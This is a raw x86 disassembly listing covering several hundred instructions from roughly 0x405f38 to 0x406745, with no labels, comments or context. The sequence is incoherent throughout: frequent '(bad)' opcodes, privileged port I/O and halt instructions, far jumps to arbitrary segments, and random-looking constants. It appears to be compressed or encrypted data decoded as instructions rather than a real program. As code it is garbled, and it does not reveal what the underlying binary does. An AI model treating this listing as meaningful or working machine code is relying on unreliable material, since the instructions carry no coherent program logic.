  405f38:	xor    esp,0xffffffeb
  405f3b:	push   ds
  405f3c:	and    dh,BYTE PTR [esi+0x61e94e36]
  405f42:	push   edi
  405f43:	cs test eax,0x19331508
  405f49:	adc    bl,bh
  405f4b:	sub    bh,0x31
  405f4e:	cld    
  405f4f:	call   0x4b3f1fe8
  405f54:	add    DWORD PTR [ebx-0x69],esi
  405f57:	(bad)  
  405f58:	std    
  405f59:	repnz int3 
  405f5b:	ja     0x405f19
  405f5d:	(bad)  
  405f5f:	outs   dx,BYTE PTR ds:[esi]
  405f60:	(bad)  
  405f61:	cmp    BYTE PTR [ebp-0xe428589],cl
  405f67:	ror    DWORD PTR [eax+0x2a3ee315],cl
  405f6d:	dec    ebx
  405f6e:	jg     0x405f64
  405f70:	mov    bh,0x47
  405f72:	jae    0x405f6b
  405f74:	mov    ch,0x34
  405f76:	xchg   edi,eax
  405f77:	or     eax,0x55dd67ec
  405f7c:	adc    edx,edx
  405f7e:	test   DWORD PTR [esi],edi
  405f80:	add    al,0xbc
  405f82:	and    DWORD PTR [ecx-0x10],ecx
  405f85:	sub    BYTE PTR [ebx+0x1e],ah
  405f88:	(bad)  
  405f8a:	pop    esi
  405f8b:	xlat   BYTE PTR ds:[ebx]
  405f8c:	cwde   
  405f8d:	sbb    DWORD PTR [ebx+0x4d],ebp
  405f90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f91:	pushf  
  405f92:	xchg   edx,eax
  405f93:	int3   
  405f94:	adc    eax,0x4359e17f
  405f99:	call   0x5e491461
  405f9e:	dec    eax
  405f9f:	mov    cl,0xee
  405fa1:	push   0x27
  405fa3:	adc    al,0x82
  405fa5:	mov    ds:0x43e2b81e,eax
  405faa:	pop    edi
  405fab:	out    dx,al
  405fac:	cmp    al,ah
  405fae:	dec    edx
  405faf:	pop    edx
  405fb0:	lods   eax,DWORD PTR ds:[esi]
  405fb1:	mov    bl,0xbb
  405fb3:	repz int3 
  405fb5:	cmp    dh,ch
  405fb7:	shl    ch,0xd3
  405fba:	sbb    al,0x3a
  405fbc:	cwde   
  405fbd:	xor    eax,0xdebb77dc
  405fc2:	aam    0x99
  405fc4:	mov    DWORD PTR [edi+eiz*4-0x32],ecx
  405fc8:	lea    esi,[ebp-0x92a885a]
  405fce:	aam    0xf4
  405fd0:	fisttp WORD PTR [edi+0x28]
  405fd3:	ds test eax,0xbf7deb06
  405fd9:	sbb    ecx,DWORD PTR gs:[edx-0x3fb430fa]
  405fe0:	mov    dl,0x11
  405fe2:	je     0x405ffd
  405fe4:	push   cs
  405fe5:	fstp   DWORD PTR [edx+0x75715418]
  405feb:	in     al,dx
  405fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fed:	mov    WORD PTR [ebp+0x21fa211f],?
  405ff3:	int    0x39
  405ff5:	test   BYTE PTR [ebp-0x7d],0x51
  405ff9:	das    
  405ffa:	neg    DWORD PTR [edi+edi*1]
  405ffd:	dec    esp
  405ffe:	dec    edi
  405fff:	jge    0x406048
  406001:	pusha  
  406002:	xor    BYTE PTR [edi],ch
  406004:	ds aad 0x5f
  406007:	loop   0x405f91
  406009:	aaa    
  40600a:	pop    edx
  40600b:	push   0xad93a88e
  406010:	add    BYTE PTR [edx+eiz*1+0x5d66f209],0x9a
  406018:	shr    BYTE PTR [edi+0x3a258219],cl
  40601e:	sbb    ebp,DWORD PTR [ebp+0x3501cfa5]
  406024:	in     eax,0x3b
  406026:	push   ebx
  406027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406028:	dec    edx
  406029:	int    0xcb
  40602b:	lods   al,BYTE PTR ds:[esi]
  40602c:	call   0x9e2b376
  406031:	mov    esp,0x948906b8
  406036:	(bad)  
  406037:	cli    
  406038:	inc    edx
  406039:	clc    
  40603a:	lods   eax,DWORD PTR ds:[esi]
  40603b:	push   ecx
  40603c:	xor    eax,0xdf5b4fb0
  406041:	sub    eax,0xb7807db2
  406046:	jo     0x406078
  406048:	xchg   BYTE PTR [eax+0x8],cl
  40604b:	mov    al,ds:0xfa7c488e
  406050:	cmp    al,BYTE PTR [ebx-0x6e3a94db]
  406056:	jno    0x406012
  406058:	icebp  
  406059:	sti    
  40605a:	jl     0x40607c
  40605c:	or     DWORD PTR [edi],0xffffff9f
  40605f:	pop    eax
  406060:	lahf   
  406061:	std    
  406062:	cmp    ebp,ebx
  406064:	(bad)  
  406065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406066:	add    ebp,DWORD PTR [esi]
  406068:	sub    BYTE PTR [eax],bl
  40606a:	or     eax,DWORD PTR [edi-0x1c]
  40606d:	sub    al,0x7
  40606f:	dec    esp
  406070:	dec    edx
  406071:	dec    edi
  406072:	popa   
  406073:	and    ah,BYTE PTR [edi+0x43]
  406076:	inc    esi
  406077:	call   0xcf6d2f21
  40607c:	mov    es,WORD PTR [ebx]
  40607e:	leave  
  40607f:	and    bl,BYTE PTR [ebx-0x3d]
  406082:	inc    eax
  406083:	inc    eax
  406084:	fsub   DWORD PTR ss:[esi-0x50]
  406088:	(bad)  
  406089:	test   al,0x0
  40608b:	and    DWORD PTR [ebx-0x2ad11107],eax
  406091:	adc    eax,DWORD PTR [ebx+0x4d]
  406094:	mov    esp,esi
  406096:	outs   dx,BYTE PTR ds:[esi]
  406097:	dec    ebp
  406098:	dec    eax
  406099:	jmp    0xe5550db5
  40609e:	sti    
  40609f:	mov    edi,0xc2f5ac51
  4060a4:	stos   DWORD PTR es:[edi],eax
  4060a5:	mov    esi,0x8f4c3d12
  4060aa:	and    ebx,ebp
  4060ac:	pop    edx
  4060ad:	or     cl,dl
  4060af:	add    ah,BYTE PTR [edx+ebp*8+0x72]
  4060b3:	xor    ah,bl
  4060b5:	int    0xfa
  4060b7:	push   esi
  4060b8:	push   ebp
  4060b9:	arpl   ax,bp
  4060bb:	(bad)  
  4060bc:	retf   
  4060bd:	lahf   
  4060be:	in     eax,dx
  4060bf:	mov    ebp,0xa9d10814
  4060c4:	sub    cl,dl
  4060c6:	dec    ebx
  4060c7:	sbb    al,0x71
  4060c9:	sbb    eax,DWORD PTR [ecx-0x27]
  4060cc:	xchg   ecx,eax
  4060cd:	jg     0x40606a
  4060cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060d0:	mov    ecx,?
  4060d2:	push   ss
  4060d3:	and    eax,DWORD PTR [edi+0x63]
  4060d6:	lods   eax,DWORD PTR ds:[esi]
  4060d7:	je     0x406069
  4060d9:	jno    0x406118
  4060db:	(bad)  
  4060dc:	int    0x97
  4060de:	int3   
  4060df:	mov    dh,BYTE PTR [ebx*4-0x99e4c5]
  4060e6:	mov    eax,0x2820d98a
  4060eb:	inc    esi
  4060ec:	lods   al,BYTE PTR ds:[esi]
  4060ed:	fdivr  st(3),st
  4060ef:	push   ecx
  4060f0:	int3   
  4060f1:	fs repnz cdq 
  4060f4:	mov    ebp,0x2ee77b4a
  4060f9:	(bad)  
  4060fa:	xor    dh,BYTE PTR [eax+0x47]
  4060fd:	(bad)  
  4060fe:	adc    DWORD PTR [edi-0x3c],esi
  406101:	mov    dl,0xdf
  406103:	sti    
  406104:	imul   ebx,DWORD PTR [edi+0x63],0xe8157948
  40610b:	scas   al,BYTE PTR es:[edi]
  40610c:	pop    edx
  40610d:	mov    eax,ds:0x2ce815fa
  406112:	push   edi
  406113:	call   0xaac51ccf
  406118:	sbb    al,0x21
  40611a:	and    DWORD PTR ds:0x910a07bc,esp
  406120:	rcl    ebp,cl
  406122:	mov    esi,ebx
  406124:	rcr    DWORD PTR [ebp+edx*4+0x2f],1
  406128:	dec    ebx
  406129:	mov    ds,WORD PTR [edi]
  40612b:	adc    eax,0xe6ce4514
  406130:	dec    esp
  406131:	sub    eax,DWORD PTR [esi+eiz*8]
  406134:	add    esp,DWORD PTR [edx-0x5f46f2b1]
  40613a:	icebp  
  40613b:	cmp    ebx,DWORD PTR fs:[ebp+0x372c13be]
  406142:	xor    eax,0xbc59297f
  406147:	mov    dl,0x6a
  406149:	cdq    
  40614a:	jge    0x40611b
  40614c:	stos   BYTE PTR es:[edi],al
  40614d:	adc    esi,DWORD PTR [ebp-0x7d]
  406150:	shl    BYTE PTR [edi],cl
  406152:	fsub   st(6),st
  406154:	shr    al,0xd6
  406157:	sbb    ecx,DWORD PTR [edi+0x7]
  40615a:	imul   esp,eax,0xbc0959e8
  406160:	cdq    
  406161:	xlat   BYTE PTR ds:[ebx]
  406162:	dec    esi
  406163:	gs retf 0x614c
  406167:	add    DWORD PTR [edx+0x2],esi
  40616a:	jns    0x40614d
  40616c:	sub    BYTE PTR [ebx-0x64],al
  40616f:	int3   
  406170:	push   edx
  406171:	adc    al,0x10
  406173:	ror    ah,1
  406175:	mov    eax,0x28249d90
  40617a:	fmul   DWORD PTR [ebp+0x55249c01]
  406180:	or     eax,0x392684ea
  406185:	test   eax,0x5b91b35e
  40618a:	dec    ebx
  40618b:	dec    esi
  40618c:	mov    al,ds:0x9a84294
  406191:	jg     0x4061b8
  406193:	lea    ebp,[ebp-0x3fd4f5e]
  406199:	call   0x42b8:0xf29d516a
  4061a0:	iret   
  4061a1:	scas   al,BYTE PTR es:[edi]
  4061a2:	(bad)  
  4061a3:	test   DWORD PTR [ecx+0x7],0x3e043086
  4061aa:	out    dx,al
  4061ab:	push   esp
  4061ac:	jmp    0x4061fa
  4061ae:	cmp    DWORD PTR ds:0x45f7331d,0xffffffdf
  4061b5:	mov    cs,WORD PTR [ecx-0x6e]
  4061b8:	push   es
  4061b9:	js     0x406199
  4061bb:	retf   
  4061bc:	jecxz  0x406176
  4061be:	pusha  
  4061bf:	mov    eax,ds:0x5659e207
  4061c4:	out    0x96,eax
  4061c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c7:	daa    
  4061c8:	stos   BYTE PTR es:[edi],al
  4061c9:	inc    esp
  4061ca:	shl    BYTE PTR [eax],1
  4061cc:	mov    al,0x2b
  4061ce:	push   ds
  4061cf:	pop    edx
  4061d0:	push   ebp
  4061d1:	imul   eax,DWORD PTR [esi+0x7f8f6668],0xffffff99
  4061d8:	mov    eax,0x34a62876
  4061dd:	push   esp
  4061de:	(bad)  
  4061df:	stc    
  4061e0:	sti    
  4061e1:	cmp    DWORD PTR [esi],ecx
  4061e3:	mov    ds:0xf23fabc1,al
  4061e8:	(bad)  
  4061e9:	loope  0x406180
  4061eb:	aas    
  4061ec:	mov    esp,0xed6d3c88
  4061f1:	pop    ss
  4061f2:	dec    edi
  4061f3:	push   edi
  4061f4:	enter  0xe826,0x72
  4061f8:	shl    DWORD PTR [esi+0x15b2ee9e],cl
  4061fe:	mov    esp,0x57067fc0
  406203:	popa   
  406204:	adc    DWORD PTR [eax-0xd],0x3ca868d3
  40620b:	nop
  40620c:	data16 sub cl,BYTE PTR ds:0xb941ed6a
  406213:	dec    edx
  406214:	les    esi,FWORD PTR ds:0xeea07640
  40621a:	sbb    ecx,DWORD PTR ds:0x86319580
  406220:	mov    dh,0x79
  406222:	adc    al,0x7d
  406224:	ret    0xcc39
  406227:	mov    bh,0xfa
  406229:	out    dx,al
  40622a:	cmp    ebp,edx
  40622c:	repz mov ebx,0xca7cb916
  406232:	nop
  406233:	shl    DWORD PTR [ebx-0x34810ed4],0x6d
  40623a:	fstp   QWORD PTR [ebx+edx*8]
  40623d:	jp     0x4061db
  40623f:	(bad)  
  406240:	sbb    BYTE PTR [edx],bl
  406242:	xor    eax,0xf793c4dc
  406247:	push   edi
  406248:	sbb    BYTE PTR [edx+ebp*1],ch
  40624b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40624c:	in     al,0x6c
  40624e:	repz mov bl,0xa4
  406251:	adc    bh,BYTE PTR [ebx-0x2ffa85c0]
  406257:	mov    bh,0x8b
  406259:	mov    BYTE PTR [eax+0x6ed6f3f4],ah
  40625f:	and    ebp,DWORD PTR ds:0x8ebfaf07
  406265:	cdq    
  406266:	std    
  406267:	repz idiv DWORD PTR [ebp+0x38]
  40626b:	adc    ebx,DWORD PTR [ecx]
  40626d:	(bad)  
  40626e:	repz and al,0xb3
  406271:	test   al,0x83
  406273:	dec    esp
  406274:	das    
  406275:	hlt    
  406276:	fs mov esp,0x49dad9b5
  40627c:	sub    DWORD PTR [ecx+0x24a43253],esi
  406282:	adc    DWORD PTR [edx],esi
  406284:	sub    bh,al
  406286:	lea    ebp,[edi+0x24]
  406289:	clc    
  40628a:	cmp    BYTE PTR [ebp+0x1c09c7aa],dh
  406290:	es mov ah,0xa8
  406293:	jno    0x406250
  406295:	(bad)  
  406296:	fbstp  TBYTE PTR ds:0xe3788a3
  40629c:	inc    eax
  40629d:	icebp  
  40629e:	mov    al,0xf2
  4062a0:	xchg   edx,eax
  4062a1:	add    BYTE PTR [ebx-0x4b],cl
  4062a4:	jecxz  0x4062f0
  4062a6:	fs inc esp
  4062a8:	lock aad 0xa4
  4062ab:	mov    esp,0xbb967ea4
  4062b0:	dec    eax
  4062b1:	paddsw mm7,mm7
  4062b4:	cli    
  4062b5:	dec    ecx
  4062b6:	add    ah,BYTE PTR [edi-0x5f]
  4062b9:	and    ebx,DWORD PTR [ecx+ecx*2-0x19]
  4062bd:	inc    esp
  4062be:	cmp    eax,DWORD PTR [esi]
  4062c0:	xor    edx,DWORD PTR [edi+0x52]
  4062c3:	xor    eax,eax
  4062c5:	xor    ebx,edi
  4062c7:	mov    dh,BYTE PTR [eax+0x15]
  4062ca:	sbb    DWORD PTR [ebp+0x32c33137],0xffffff81
  4062d1:	sbb    edi,edi
  4062d3:	(bad)  
  4062d5:	or     DWORD PTR [eax+0x7f],0xe6641862
  4062dc:	xor    bh,ch
  4062de:	mov    esp,0x8b833f83
  4062e3:	loopne 0x406326
  4062e5:	and    al,0x3e
  4062e7:	sbb    DWORD PTR [ebx],0xc6b5aded
  4062ed:	dec    edx
  4062ee:	scas   al,BYTE PTR es:[edi]
  4062ef:	dec    ecx
  4062f0:	(bad)  
  4062f2:	jmp    0xcf496b46
  4062f7:	add    BYTE PTR [ebx],dl
  4062f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062fa:	stos   DWORD PTR es:[edi],eax
  4062fb:	loope  0x40635c
  4062fd:	shr    cl,1
  4062ff:	push   eax
  406300:	and    eax,0x2af6d419
  406305:	jmp    0x97a0eb0b
  40630a:	jmp    0x8fa2:0x2251f770
  406311:	mov    cl,0x7d
  406313:	pop    edi
  406314:	xchg   edx,eax
  406315:	shr    ah,0xd7
  406318:	fmul   DWORD PTR [ecx-0x18045486]
  40631e:	sub    bh,BYTE PTR [ecx-0x1683fb19]
  406324:	cmp    ebx,0xfffffff9
  406327:	sbb    al,0xe8
  406329:	jmp    0x8aff:0x7a261159
  406330:	xor    BYTE PTR [edx+edx*4-0x54283da9],bl
  406337:	sub    ebp,edi
  406339:	cld    
  40633a:	(bad)  
  40633b:	push   edx
  40633c:	psrld  mm7,QWORD PTR ds:0x606fa315
  406343:	sub    bl,BYTE PTR [ebp-0x7e207e0a]
  406349:	icebp  
  40634a:	xchg   edx,eax
  40634b:	adc    dl,ah
  40634d:	popa   
  40634e:	jo     0x4062fc
  406350:	fisub  WORD PTR [edi+eiz*8-0x7e43f83d]
  406357:	adc    ebx,DWORD PTR [ebx]
  406359:	mov    ch,BYTE PTR [ebp+ebx*4-0xd506c5]
  406360:	inc    eax
  406361:	and    BYTE PTR [eax],0xc4
  406364:	fs push cs
  406366:	push   cs
  406367:	ret    
  406368:	inc    edi
  406369:	jns    0x406338
  40636b:	dec    esi
  40636c:	or     esi,0xc2296070
  406372:	sahf   
  406373:	pop    esp
  406374:	adc    eax,0x774bf143
  406379:	add    eax,edi
  40637b:	je     0x4063b0
  40637d:	out    0x70,al
  40637f:	mov    al,bl
  406381:	stos   BYTE PTR es:[edi],al
  406382:	mov    cl,0x52
  406384:	sub    DWORD PTR [eax-0x4885f1cd],esp
  40638a:	enter  0xc979,0x5d
  40638e:	stc    
  40638f:	mov    eax,0xd49d4c56
  406394:	lods   eax,DWORD PTR ds:[esi]
  406395:	arpl   bp,ax
  406397:	inc    ebp
  406398:	add    dh,BYTE PTR [esi]
  40639a:	or     al,0xfc
  40639c:	fidivr WORD PTR [ecx+ebx*1-0x1763f51d]
  4063a3:	js     0x40637f
  4063a5:	xor    eax,0xe1a0b53a
  4063aa:	cdq    
  4063ab:	popf   
  4063ac:	mov    ecx,0x62d4699e
  4063b1:	lahf   
  4063b2:	or     al,0x65
  4063b4:	push   esi
  4063b5:	fucomip st,st(3)
  4063b7:	add    DWORD PTR [esi+0x399e4e38],edi
  4063bd:	or     al,0x4f
  4063bf:	jge    0x4063c9
  4063c1:	add    eax,0x483b6e51
  4063c6:	imul   edi,DWORD PTR [ecx],0xffffffb2
  4063c9:	or     BYTE PTR [edx+0x7ba21a82],ch
  4063cf:	push   cs
  4063d0:	xchg   esp,eax
  4063d1:	arpl   WORD PTR [edx+0x5b],dx
  4063d4:	jnp    0x406454
  4063d6:	inc    ecx
  4063d7:	in     eax,0x22
  4063d9:	sub    eax,0x3dd81a68
  4063de:	bswap  ecx
  4063e0:	sub    DWORD PTR ds:0x13b62ba7,esp
  4063e6:	sar    bh,0xdb
  4063e9:	std    
  4063ea:	mov    edi,0xc1183e34
  4063ef:	sub    BYTE PTR [ebx+0x1f],cl
  4063f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063f3:	pop    ss
  4063f4:	paddd  mm3,QWORD PTR [edx-0x52e4ed4f]
  4063fb:	or     ebx,DWORD PTR [esi+0x77]
  4063fe:	int    0x31
  406400:	inc    edx
  406401:	sub    bh,BYTE PTR [esi-0x79]
  406404:	int    0x9
  406406:	icebp  
  406407:	outs   dx,DWORD PTR ds:[esi]
  406408:	mov    sp,0xf3a6
  40640c:	xchg   esp,eax
  40640d:	imul   DWORD PTR [ecx-0x5770b08d]
  406413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406414:	cdq    
  406415:	jb     0x406412
  406417:	aas    
  406418:	xchg   edi,eax
  406419:	add    al,0x84
  40641b:	push   esi
  40641c:	dec    esp
  40641d:	xchg   ecx,eax
  40641e:	fisttp QWORD PTR [ebx-0x4e3196f4]
  406424:	sub    BYTE PTR [edi+0x430d32e],bl
  40642a:	out    dx,eax
  40642b:	iret   
  40642c:	jbe    0x406401
  40642e:	push   0x6f
  406430:	dec    edi
  406431:	xor    esi,DWORD PTR [ebx*4+0x40a958eb]
  406438:	push   ecx
  406439:	mov    edi,es
  40643b:	mov    eax,es:0x7e6e2962
  406441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406442:	in     al,dx
  406443:	jecxz  0x4063d2
  406445:	mov    esp,0x158b1cfb
  40644a:	cdq    
  40644b:	adc    al,0xe3
  40644d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40644e:	inc    eax
  40644f:	cli    
  406450:	addr16 hlt 
  406452:	into   
  406453:	(bad)  
  406454:	es es stc 
  406457:	nop
  406458:	das    
  406459:	jmp    0xec503bcc
  40645e:	mov    ebp,0xdeaf7fff
  406463:	cmp    eax,0x327ee068
  406468:	push   esp
  406469:	push   ebx
  40646a:	call   0xafc7d8b9
  40646f:	addr16 in al,dx
  406471:	rol    BYTE PTR [esi-0x767da89c],cl
  406477:	scas   eax,DWORD PTR es:[edi]
  406478:	pop    eax
  406479:	jae    0x4064e9
  40647b:	ror    BYTE PTR [esp+eiz*8+0xa],1
  40647f:	inc    edx
  406480:	pop    es
  406481:	adc    ebx,DWORD PTR [ebx-0x60723df3]
  406487:	cmp    DWORD PTR [ecx+ebp*2],eax
  40648a:	or     BYTE PTR [esi],bh
  40648c:	not    BYTE PTR [ebx+0x20]
  40648f:	loop   0x4064e8
  406491:	ins    BYTE PTR es:[edi],dx
  406492:	mov    ah,0xc0
  406494:	cmp    ah,bl
  406496:	mov    bl,BYTE PTR [esi-0x769765b0]
  40649c:	out    0x28,eax
  40649e:	cli    
  40649f:	test   BYTE PTR [ebp-0x79ccd347],0x54
  4064a6:	pop    esi
  4064a7:	xchg   BYTE PTR [eax+edi*1-0x51],dl
  4064ab:	jno    0x40648c
  4064ad:	popf   
  4064ae:	jae    0x406479
  4064b0:	aas    
  4064b1:	aam    0x58
  4064b3:	pop    es
  4064b4:	mov    esp,0x842af112
  4064b9:	inc    ecx
  4064ba:	ret    0x1bc0
  4064bd:	ja     0x4064c7
  4064bf:	push   ss
  4064c0:	rcr    DWORD PTR [edx+0x20c96ff8],1
  4064c6:	mov    ch,0x26
  4064c8:	sub    edx,DWORD PTR ds:0x5e205440
  4064ce:	in     eax,dx
  4064cf:	xor    DWORD PTR [ebx-0x43],eax
  4064d2:	test   al,0x89
  4064d4:	push   esi
  4064d5:	xor    eax,0x48d10661
  4064da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064db:	(bad)
  4064de:	sub    edi,DWORD PTR [edi]
  4064e0:	pop    ss
  4064e1:	mov    esp,0xeca903ab
  4064e6:	or     al,0xb6
  4064e8:	jmp    0x40652d
  4064ea:	je     0x4064f4
  4064ec:	mov    BYTE PTR [edx+eiz*4],0x94
  4064f0:	lds    edi,FWORD PTR [ebx]
  4064f2:	dec    eax
  4064f3:	adc    eax,0x34bfff11
  4064f8:	sub    ebx,DWORD PTR [ebx+0x5c]
  4064fb:	mov    edi,0x39abe4cf
  406500:	fsubr  QWORD PTR [ebp+0x3c]
  406503:	imul   BYTE PTR [ecx+0x66b44b51]
  406509:	dec    ebp
  40650a:	loope  0x406523
  40650c:	fdivr  DWORD PTR [ecx-0x3c4a4add]
  406512:	pop    esi
  406513:	xor    DWORD PTR [edi-0x2e],esp
  406516:	mov    cl,0x66
  406518:	loopne 0x4064d9
  40651a:	jnp    0x406519
  40651c:	int3   
  40651d:	mov    ds:0xbc095d8c,eax
  406522:	or     DWORD PTR [ecx+0x79],edi
  406525:	int3   
  406526:	xchg   edx,eax
  406527:	test   eax,0x4055b61d
  40652c:	mov    eax,ds:0x44c6088a
  406531:	inc    esp
  406532:	dec    ebx
  406533:	and    eax,0x789cea62
  406538:	pop    ds
  406539:	mov    esi,0xbcc4173a
  40653e:	mov    cl,0x4
  406540:	shl    DWORD PTR [eax+0x6e],cl
  406543:	jno    0x40654e
  406545:	aas    
  406546:	bound  ebx,QWORD PTR [esi+eax*2+0x228fa04c]
  40654d:	xor    DWORD PTR [ecx],ebp
  40654f:	and    esi,ecx
  406551:	mov    eax,0xae94fcd3
  406556:	and    al,0xf5
  406558:	rsm    
  40655a:	xor    BYTE PTR [ecx],ah
  40655c:	out    dx,al
  40655d:	lods   al,BYTE PTR ds:[esi]
  40655e:	dec    eax
  40655f:	(bad)  
  406560:	fldz   
  406562:	out    0x92,eax
  406564:	xchg   esp,eax
  406565:	mov    ds:0x62fc0830,al
  40656a:	mov    esp,0xe26eac28
  40656f:	pop    ecx
  406570:	jge    0x40658e
  406572:	jl     0x406559
  406574:	(bad)  
  406575:	cmp    eax,0xb15d6f77
  40657a:	mov    esp,0x4ab4005b
  40657f:	sub    ch,cl
  406581:	mov    esp,0x6ed86341
  406586:	mov    al,ds:0x22f835bc
  40658b:	sbb    DWORD PTR [edx],eax
  40658d:	popa   
  40658e:	mov    fs,WORD PTR [ebx]
  406590:	arpl   dx,dx
  406592:	xor    al,0x29
  406594:	imul   edx,DWORD PTR [edi],0x34
  406597:	bound  edx,QWORD PTR [eax-0x63]
  40659a:	iret   
  40659b:	mov    cl,BYTE PTR [ebx]
  40659d:	mov    eax,0x4c362e12
  4065a2:	inc    edi
  4065a3:	xchg   edi,eax
  4065a4:	pusha  
  4065a5:	jmp    0x4065ed
  4065a7:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4065a9:	test   al,0xe3
  4065ab:	mov    BYTE PTR [edi-0x5d],bh
  4065ae:	sti    
  4065af:	test   DWORD PTR [ecx+0x6414e76d],esi
  4065b5:	sar    BYTE PTR [edx],1
  4065b7:	(bad)  
  4065b8:	ins    BYTE PTR es:[edi],dx
  4065b9:	fadd   DWORD PTR [ecx+0x4]
  4065bc:	sub    al,0xd1
  4065be:	mov    ds:0xab1f73b1,al
  4065c3:	sub    esp,DWORD PTR [edi-0x4166812a]
  4065c9:	out    0x49,eax
  4065cb:	xor    eax,eax
  4065cd:	push   0xcd3789f5
  4065d2:	(bad)  
  4065d4:	cs add al,0x2d
  4065d7:	ret    0xce2e
  4065da:	fdiv   st,st(4)
  4065dc:	icebp  
  4065dd:	push   ebx
  4065de:	aaa    
  4065df:	fsub   DWORD PTR [ecx-0x1e62894]
  4065e5:	xchg   ebp,eax
  4065e6:	mov    eax,0xfe778508
  4065eb:	jge    0x40660c
  4065ed:	jge    0x406650
  4065ef:	add    BYTE PTR [edi+ebp*4-0x6],bh
  4065f3:	sub    BYTE PTR [eax],ch
  4065f5:	jo     0x406673
  4065f7:	mov    WORD PTR [ebx-0x4ce295a1],fs
  4065fd:	pop    esi
  4065fe:	ds inc ecx
  406600:	ficomp WORD PTR [edx-0x60f1a9d7]
  406606:	stos   BYTE PTR es:[edi],al
  406607:	(bad)  
  406609:	cdq    
  40660a:	add    BYTE PTR [eax],ah
  40660c:	jmp    0xd1e:0x276f7c2c
  406613:	int3   
  406614:	jmp    0x937a:0xa012b41a
  40661b:	std    
  40661c:	xchg   DWORD PTR [edx+esi*2],ebp
  40661f:	ss adc al,0x6c
  406622:	xchg   esp,eax
  406623:	mov    ds:0xc4d119eb,eax
  406628:	mov    ecx,0x56addac2
  40662d:	hlt    
  40662e:	jbe    0x40663d
  406630:	add    edi,DWORD PTR [esi]
  406632:	mov    bl,0x2c
  406634:	cwde   
  406635:	(bad)  
  406636:	pop    edx
  406637:	in     al,dx
  406638:	ret    
  406639:	push   es
  40663a:	inc    esi
  40663b:	adc    ebx,DWORD PTR [ebx-0x59b709bb]
  406641:	cmp    DWORD PTR [edi],edx
  406643:	jle    0x406650
  406645:	cmp    ch,ah
  406647:	xchg   DWORD PTR [edi-0x669bc0b0],esi
  40664d:	pop    ecx
  40664e:	dec    eax
  40664f:	mov    ds:0xc6981e4e,eax
  406654:	xchg   ebx,eax
  406655:	push   esp
  406656:	mov    ?,WORD PTR [esp+ebx*4-0x2036b93a]
  40665d:	in     al,dx
  40665e:	out    0xed,eax
  406660:	pop    ds
  406661:	enter  0x169c,0xf
  406665:	(bad)  
  406666:	cwde   
  406667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406668:	pop    ds
  406669:	mov    edi,0xf3f1d780
  40666e:	mov    ecx,0xb158c1ec
  406673:	push   es
  406674:	call   0x4c17dd3a
  406679:	iret   
  40667a:	fwait
  40667b:	addr16 mov ds:0x7ac6,al
  40667f:	into   
  406680:	sar    ecx,1
  406682:	sbb    eax,0xd79d93ff
  406687:	clc    
  406688:	sub    eax,0xa71ad348
  40668d:	lods   al,BYTE PTR ds:[esi]
  40668e:	inc    ebp
  40668f:	pop    edi
  406690:	jne    0x4066d5
  406692:	call   0x7bcd805
  406697:	and    DWORD PTR [ebx],ecx
  406699:	push   esi
  40669a:	fisttp QWORD PTR [esi+0x52]
  40669d:	jbe    0x4066d7
  40669f:	shl    DWORD PTR [ebp+0x29399ff1],0x62
  4066a6:	add    al,0xe8
  4066a8:	mov    al,0x8e
  4066aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066ab:	stos   BYTE PTR es:[edi],al
  4066ac:	mov    dh,0xb
  4066ae:	out    dx,al
  4066af:	push   edi
  4066b0:	dec    eax
  4066b1:	mov    bh,0xb7
  4066b3:	add    DWORD PTR [eax],edx
  4066b5:	jmp    0x406664
  4066b7:	leave  
  4066b8:	xchg   edx,eax
  4066b9:	pop    ss
  4066ba:	push   edi
  4066bb:	sub    ebx,DWORD PTR [eax+0x3b]
  4066be:	into   
  4066bf:	sbb    edi,ebx
  4066c1:	cmp    eax,0xe25c9a7e
  4066c6:	dec    edi
  4066c7:	hlt    
  4066c8:	or     al,0x6
  4066ca:	ss push es
  4066cc:	in     al,dx
  4066cd:	mov    ch,0x53
  4066cf:	sub    BYTE PTR ds:0xc23db729,cl
  4066d5:	add    DWORD PTR [ebx-0x7f71778],esi
  4066db:	sub    al,0x5
  4066dd:	fbld   TBYTE PTR [ecx+0x499b7334]
  4066e3:	xchg   edx,eax
  4066e4:	pop    ebp
  4066e5:	pop    ss
  4066e6:	jecxz  0x4066a9
  4066e8:	or     DWORD PTR [ebx],ecx
  4066ea:	xor    BYTE PTR gs:[esi-0x3b],ch
  4066ee:	inc    ebx
  4066ef:	in     eax,0xee
  4066f1:	or     eax,0x91a89a45
  4066f6:	mov    ds,WORD PTR [edx+0x1c4d920b]
  4066fc:	cmp    BYTE PTR [eax+0x64],bl
  4066ff:	data16 sbb cl,dh
  406702:	xor    bh,BYTE PTR [esi+0x35074fd7]
  406708:	adc    esi,DWORD PTR [edi]
  40670a:	icebp  
  40670b:	hlt    
  40670c:	addr16 test eax,0xf745b6c3
  406712:	shr    DWORD PTR [edx],cl
  406714:	push   ds
  406715:	xchg   ecx,eax
  406716:	test   eax,0xee00ae39
  40671b:	adc    bh,0xa7
  40671e:	push   0x64
  406720:	jle    0x4066b4
  406722:	cmp    al,0xee
  406724:	add    DWORD PTR [ecx-0x10],ebp
  406727:	push   bp
  406729:	fdivp  st(7),st
  40672b:	mov    WORD PTR [ebp+0x1fa6e809],es
  406731:	addr16 cdq 
  406733:	mov    ch,0x61
  406735:	inc    edi
  406736:	inc    ecx
  406737:	iret   
  406738:	sbb    ecx,DWORD PTR [ebx-0xfe21fcc]
  40673e:	in     al,0xec
  406740:	enter  0x3a8b,0xd7
  406744:	icebp  
  406745:	sar    DWORD PTR [edi+0x47],1
